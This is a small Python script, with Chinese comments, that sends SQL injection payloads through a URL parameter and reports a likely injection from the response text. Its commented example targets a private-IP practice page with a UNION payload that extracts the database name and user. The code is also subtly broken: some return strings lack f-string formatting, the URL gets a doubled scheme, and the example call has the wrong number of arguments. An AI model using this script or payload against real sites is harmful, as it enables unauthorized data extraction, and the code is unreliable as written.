import requests  
from urllib.parse import quote
  
def sql_injection_check(url, payload):  
    param_name = url.split('?')[1].split('=')[0]
    # 构造带有payload的URL  
    base_url = url.split('?')[0]
    encoded_payload = quote(payload, safe='')
    test_url = f"http://{base_url}?{param_name}={encoded_payload}&submit=查询"  
    try:  
        response = requests.get(test_url)  
        if response.status_code == 200:  
            # 检查响应中是否包含特定的字符串  
            if "your uid" in response.text or "your email is" in response.text:  
                return "[+] Potential SQL Injection Detected with Payload: %s" % encoded_payload
                # print(f"[+] Response: {response.text}")  
            else:  
                return "[-] No clear signs of SQL Injection with Payload: %s" % encoded_payload
                # 你也可以记录或打印完整的响应，以便后续分析  
        else:  
            return "[-] Non-200 response code: {response.status_code}"  
    except Exception as e:  
        return "[-] Error fetching {test_url}: {e}" 
  
# 示例用法  
# url = 'http://192.168.207.128:80/vul/sqli/sqli_str.php'  
# param_name = 'name'  
# payload = "x' union select database(),user()#"  # 注意：这里去掉了&submit=查询，因为它可能是提交按钮的值  
  
# sql_injection_check(url, param_name, payload)